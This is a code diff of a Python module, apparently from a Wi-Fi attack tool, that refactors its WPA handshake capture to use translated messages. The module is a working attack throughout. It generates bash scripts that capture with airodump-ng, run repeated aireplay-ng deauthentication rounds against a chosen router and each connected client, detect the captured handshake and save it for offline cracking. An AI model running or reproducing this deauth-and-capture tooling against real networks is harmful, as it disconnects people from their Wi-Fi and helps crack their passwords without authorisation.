@@ -5,6 +5,7 @@
 """
 
 import os
+import re
 import time
 import signal
 import shutil
@@ -15,8 +16,15 @@ from pathlib import Path
 
 from .terminal import find_terminal, launch_in_terminal, kill_group
 from .iface import set_channel
-from .netscan import scan_networks, display_networks, ask_scan_duration
+from .netscan import scan_networks, choose_network, ask_scan_duration
 from .constants import WATCHDOG
+from .i18n import t
+
+
+def _sh(s):
+    """Безопасно оборачивает строку в одинарные кавычки для bash
+    (ESSID с апострофом, напр. O'Brien, иначе ломает echo '...')."""
+    return "'" + str(s).replace("'", "'\\''") + "'"
 
 
 # ============ Проверка handshake ============
@@ -30,7 +38,6 @@ def check_handshake(cap_file):
             capture_output=True, text=True, timeout=30
         )
         out = r.stdout + r.stderr
-        import re
         if re.search(r"\b1 handshake\b", out, re.IGNORECASE):
             return True
         if "WPA handshake" in out:
@@ -54,12 +61,14 @@ def _build_capture_script(work_dir, interface, target):
         f'--write "{prefix}" --output-format pcap,csv '
         f'{interface}'
     )
+    title = t("cap.win_capture", essid=target['essid'] or t("common.hidden"),
+              bssid=bssid, ch=channel)
 
     script_path = Path(work_dir) / "capture.sh"
     script_path.write_text(
         "#!/bin/bash\n"
-        f"echo '=== Захват handshake: {target['essid'] or '<скрытая>'} ({bssid}), канал {channel} ==='\n"
-        "echo 'Ctrl+C — остановить захват.'\n"
+        f"echo {_sh(title)}\n"
+        f"echo {_sh(t('cap.win_stop'))}\n"
         "echo\n"
         f"{cmd}\n"
     )
@@ -83,27 +92,26 @@ def _build_deauth_script(work_dir, interface, target):
         f'BSSID="{bssid}"\n'
         f'CSV="{csv_file}"\n'
         "\n"
-        "echo '=== Деаутентификация ==='\n"
-        "echo \"Цель (роутер): $BSSID\"\n"
-        "echo \"Интерфейс:     $IFACE\"\n"
-        "echo \"CSV станций:   $CSV\"\n"
-        "echo 'Ctrl+C — остановить.'\n"
+        f"echo {_sh(t('cap.deauth_title'))}\n"
+        f"echo \"{t('cap.deauth_target')} $BSSID\"\n"
+        f"echo \"{t('cap.deauth_iface')} $IFACE\"\n"
+        f"echo \"{t('cap.deauth_csv')} $CSV\"\n"
+        f"echo {_sh(t('cap.deauth_stop'))}\n"
         "echo\n"
         "\n"
         "ROUND=0\n"
         "while true; do\n"
         "    ROUND=$((ROUND+1))\n"
         "    echo\n"
-        "    echo \"========== Раунд $ROUND ==========\"\n"
+        f"    echo \"========== {t('cap.round')} $ROUND ==========\"\n"
         "\n"
-        "    # --- Фаза 1: broadcast на роутер ---\n"
-        "    echo \"[$(date +%H:%M:%S)] Фаза 1: broadcast deauth на роутер\"\n"
+        f"    echo \"[$(date +%H:%M:%S)] {t('cap.phase1')}\"\n"
         "    aireplay-ng --deauth 15 -a \"$BSSID\" \"$IFACE\" 2>&1 | tail -5\n"
-        "    echo \"[$(date +%H:%M:%S)] Ждём 8 сек, чтобы клиенты переподключились...\"\n"
+        f"    echo \"[$(date +%H:%M:%S)] {t('cap.wait8')}\"\n"
         "    sleep 8\n"
         "\n"
         "    if [ ! -f \"$CSV\" ]; then\n"
-        "        echo \"[$(date +%H:%M:%S)] CSV ещё не создан, повторяю broadcast.\"\n"
+        f"        echo \"[$(date +%H:%M:%S)] {t('cap.no_csv')}\"\n"
         "        continue\n"
         "    fi\n"
         "\n"
@@ -117,21 +125,20 @@ def _build_deauth_script(work_dir, interface, target):
         "    ' \"$CSV\" | sort -u)\n"
         "\n"
         "    if [ -z \"$STATIONS\" ]; then\n"
-        "        echo \"[$(date +%H:%M:%S)] Клиентов пока нет. Повторяю broadcast.\"\n"
+        f"        echo \"[$(date +%H:%M:%S)] {t('cap.no_clients')}\"\n"
         "        continue\n"
         "    fi\n"
         "\n"
         "    N=$(echo \"$STATIONS\" | wc -l)\n"
-        "    echo \"[$(date +%H:%M:%S)] Обнаружено клиентов: $N\"\n"
+        f"    echo \"[$(date +%H:%M:%S)] {t('cap.clients_found')} $N\"\n"
         "\n"
-        "    # --- Фаза 2: targeted deauth по каждому клиенту ---\n"
         "    for STATION in $STATIONS; do\n"
-        "        echo \"[$(date +%H:%M:%S)] Фаза 2: targeted deauth -> $STATION\"\n"
+        f"        echo \"[$(date +%H:%M:%S)] {t('cap.phase2')} $STATION\"\n"
         "        aireplay-ng --deauth 20 -a \"$BSSID\" -c \"$STATION\" \"$IFACE\" 2>&1 | tail -3\n"
         "        sleep 3\n"
         "    done\n"
         "\n"
-        "    echo \"[$(date +%H:%M:%S)] Все клиенты обработаны. Новый раунд через 20 сек...\"\n"
+        f"    echo \"[$(date +%H:%M:%S)] {t('cap.round_done')}\"\n"
         "    sleep 20\n"
         "done\n"
     )
@@ -162,8 +169,6 @@ def _revive_watchdog(interface, watch_files, stop_event,
     поднимается и файлы законно отсутствуют.
     """
     start = time.time()
-    # cooldown должен действовать и на первой итерации (иначе оживление
-    # запускалось бы сразу, ещё до создания файлов захвата).
     last_revive = start
     seen_file = False
 
@@ -171,24 +176,18 @@ def _revive_watchdog(interface, watch_files, stop_event,
         time.sleep(check_interval)
         if stop_event.is_set():
             break
-
         if time.time() - start < startup_grace:
             continue
-
         if any(os.path.exists(p) for p in watch_files):
             seen_file = True
         elif not seen_file:
             continue
-
         if _any_file_fresh(watch_files, stale_threshold):
             continue
-
         if time.time() - last_revive < cooldown:
             continue
 
-        print(f"\n[!] Ни .cap, ни .csv не обновляются >{stale_threshold} сек — "
-              f"оживляю без фиксации канала ({revive_seconds} сек).")
-
+        print(t("cap.revive", n=stale_threshold, r=revive_seconds))
         revive = subprocess.Popen(
             ["airodump-ng", interface],
             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
@@ -208,9 +207,8 @@ def _revive_watchdog(interface, watch_files, stop_event,
                     os.killpg(os.getpgid(revive.pid), signal.SIGKILL)
             except (ProcessLookupError, PermissionError):
                 pass
-
         last_revive = time.time()
-        print("[+] Оживление завершено.")
+        print(t("cap.revive_done"))
 
 
 # ============ Захват ============
@@ -218,10 +216,10 @@ def _revive_watchdog(interface, watch_files, stop_event,
 def capture_handshake(interface, target, work_dir, timeout=180, deauth=True):
     bssid = target['bssid']
     channel = target['channel']
-    essid = target['essid'] or '<скрытая>'
+    essid = target['essid'] or t("common.hidden")
 
     if not channel.isdigit():
-        print(f"[-] Некорректный канал: {channel!r}")
+        print(t("cap.bad_channel", ch=repr(channel)))
         return None
 
     # Фиксируем канал адаптера, чтобы оба окна работали на одном канале
@@ -232,7 +230,7 @@ def capture_handshake(interface, target, work_dir, timeout=180, deauth=True):
 
     term_name, term_cmd = find_terminal()
     if term_name is None:
-        print("[!] Терминал не найден. Захват в этом окне, без графики.")
+        print(t("cap.no_term"))
         prefix = str(work_dir / f"capture_{bssid.replace(':', '')}")
         airodump = subprocess.Popen(
             ["airodump-ng", "--bssid", bssid, "--channel", channel,
@@ -266,9 +264,9 @@ def capture_handshake(interface, target, work_dir, timeout=180, deauth=True):
                         time.sleep(1)
             threading.Thread(target=_deauth_loop, daemon=True).start()
 
-    print(f"\n[*] Цель:    {essid} ({bssid}), канал {channel}")
-    print(f"[*] Файл:    {cap_file}")
-    print(f"[*] Таймаут: {timeout} сек (Ctrl+C — остановить)")
+    print(t("cap.target", essid=essid, bssid=bssid, ch=channel))
+    print(t("cap.file", f=cap_file))
+    print(t("cap.timeout", t=timeout))
 
     csv_file = cap_file.replace("-01.cap", "-01.csv")
     watch_files = [cap_file, csv_file]
@@ -282,25 +280,30 @@ def capture_handshake(interface, target, work_dir, timeout=180, deauth=True):
 
     start = time.time()
     found = False
+    last_mtime = 0.0        # перф: aircrack-ng гоняем только когда .cap изменился
     try:
         while time.time() - start < timeout:
             if cap_term is not None and cap_term.poll() is not None:
-                print("\n[*] Окно захвата закрыто.")
+                print(t("cap.win_closed"))
                 break
             if deauth_term is not None and deauth_term.poll() is not None:
-                print("\n[*] Окно деаутентификации закрыто.")
+                print(t("cap.deauth_closed"))
                 break
 
-            if os.path.exists(cap_file) and check_handshake(cap_file):
-                found = True
-                print("\n[+] Handshake найден!")
-                break
+            if os.path.exists(cap_file):
+                mtime = os.path.getmtime(cap_file)
+                if mtime != last_mtime:
+                    last_mtime = mtime
+                    if check_handshake(cap_file):
+                        found = True
+                        print(t("cap.found"))
+                        break
 
             remaining = int(timeout - (time.time() - start))
-            print(f"\r[*] Ожидание... {remaining:3d} сек", end='', flush=True)
-            time.sleep(3)
+            print(t("cap.waiting", r=remaining), end='', flush=True)
+            time.sleep(5)
     except KeyboardInterrupt:
-        print("\n[*] Прервано.")
+        print(t("common.interrupted"))
     finally:
         stop_watchdog.set()
         kill_group(deauth_term)
@@ -311,16 +314,16 @@ def capture_handshake(interface, target, work_dir, timeout=180, deauth=True):
                 airodump.wait(timeout=5)
             except Exception:
                 airodump.kill()
-        time.sleep(1)
+        time.sleep(0.5)
 
     print()
     if os.path.exists(cap_file):
         if found or check_handshake(cap_file):
-            print(f"[+] Handshake сохранён: {cap_file}")
+            print(t("cap.saved", f=cap_file))
         else:
-            print(f"[-] Handshake не найден. Файл: {cap_file}")
+            print(t("cap.not_found", f=cap_file))
         return cap_file
-    print("[-] Файл захвата не создан.")
+    print(t("cap.no_file"))
     return None
 
 
@@ -329,11 +332,11 @@ def capture_handshake(interface, target, work_dir, timeout=180, deauth=True):
 def ask_save_path(cap_file):
     """Спрашивает, куда сохранить пойманный handshake. Path или None."""
     default = Path.cwd() / Path(cap_file).name
-    print(f"\n[+] Handshake пойман.")
-    print(f"    По умолчанию: {default}")
-    print("    Enter — сохранить по умолчанию, 'c' — отменить сохранение.")
+    print(t("cap.caught"))
+    print(t("cap.default_path", p=default))
+    print(t("cap.save_hint"))
 
-    user = input("Путь: ").strip()
+    user = input(t("cap.path_prompt")).strip()
     if user.lower() == 'c':
         return None
 
@@ -348,13 +351,13 @@ def ask_save_path(cap_file):
         try:
             target.parent.mkdir(parents=True, exist_ok=True)
         except OSError as e:
-            print(f"[-] Не удалось создать директорию: {e}")
+            print(t("cap.mkdir_fail", e=e))
             return None
 
     if target.exists():
-        ans = input(f"'{target}' уже существует. Перезаписать? (y/n): ").strip().lower()
+        ans = input(t("cap.overwrite", t=target)).strip().lower()
         if ans != 'y':
-            print("[*] Сохранение отменено.")
+            print(t("cap.save_cancel"))
             return None
 
     return target
@@ -362,20 +365,20 @@ def ask_save_path(cap_file):
 
 def choose_action():
     """Меню действий с сетью: 'deauth' | 'passive' | None."""
-    print("\nДействия с выбранной сетью:")
-    print("  1. Деаутентификация")
-    print("  2. Пассивное наблюдение")
+    print(t("cap.actions_title"))
+    print(t("cap.act_deauth"))
+    print(t("cap.act_passive"))
     print()
-    print("  0. Назад")
+    print(t("cap.act_back"))
     while True:
-        c = input("Действие: ").strip()
+        c = input(t("cap.act_prompt")).strip()
         if c == '0':
             return None
         if c == '1':
             return 'deauth'
         if c == '2':
             return 'passive'
-        print("Неизвестный пункт. Введите 1, 2 или 0.")
+        print(t("cap.act_bad"))
 
 
 def handshake_flow(interface):
@@ -383,51 +386,27 @@ def handshake_flow(interface):
     tmp_dir = Path(tempfile.mkdtemp(prefix="wifitool_"))
     try:
         duration = ask_scan_duration()
-
         networks = scan_networks(interface, duration, tmp_dir)
         if not networks:
-            print("[-] Сети не найдены.")
+            print(t("scan.none"))
             return
 
-        display_networks(networks)
-
-        target = None
-        while True:
-            try:
-                choice = input(
-                    f"\nВыберите номер сети (1-{len(networks)}, 0 — отмена): "
-                ).strip()
-            except (KeyboardInterrupt, EOFError):
-                print("\n[*] Отменено.")
-                return
-
-            if choice == "":
-                print("Пустой ввод. Введите число или 0 для отмены.")
-                continue
-            if choice == "0":
-                print("[*] Отменено.")
-                return
-            try:
-                idx = int(choice) - 1
-            except ValueError:
-                print(f"Ошибка: нужно целое число от 0 до {len(networks)}.")
-                continue
-            if 0 <= idx < len(networks):
-                target = networks[idx]
-                break
-            print(f"Ошибка: число должно быть от 1 до {len(networks)}.")
+        target = choose_network(networks)
+        if target is None:
+            return
 
         while True:
-            print(f"\n[*] Цель: {target['essid'] or '<скрытая>'} ({target['bssid']})")
+            print(t("cap.target_line", essid=target['essid'] or t("common.hidden"),
+                    bssid=target['bssid']))
             action = choose_action()
             if action is None:
-                print("[*] Возврат в меню.")
+                print(t("cap.back_menu"))
                 return
 
             deauth = (action == 'deauth')
 
             try:
-                timeout_str = input("\nТаймаут захвата в секундах (Enter = 180): ").strip()
+                timeout_str = input(t("cap.ask_timeout")).strip()
                 timeout = int(timeout_str) if timeout_str else 180
                 if timeout <= 0:
                     timeout = 180
@@ -443,13 +422,13 @@ def handshake_flow(interface):
                 if save_path:
                     try:
                         shutil.move(cap_file, save_path)
-                        print(f"\n[+] Handshake сохранён: {save_path}")
+                        print(t("cap.saved", f=save_path))
                     except Exception as e:
-                        print(f"[-] Не удалось сохранить: {e}")
+                        print(t("cap.save_fail", e=e))
                 else:
-                    print("[*] Файл не сохранён.")
+                    print(t("cap.not_saved"))
             else:
-                print("\n[-] Handshake не пойман.")
+                print(t("cap.not_caught"))
     finally:
         try:
             shutil.rmtree(tmp_dir, ignore_errors=True)
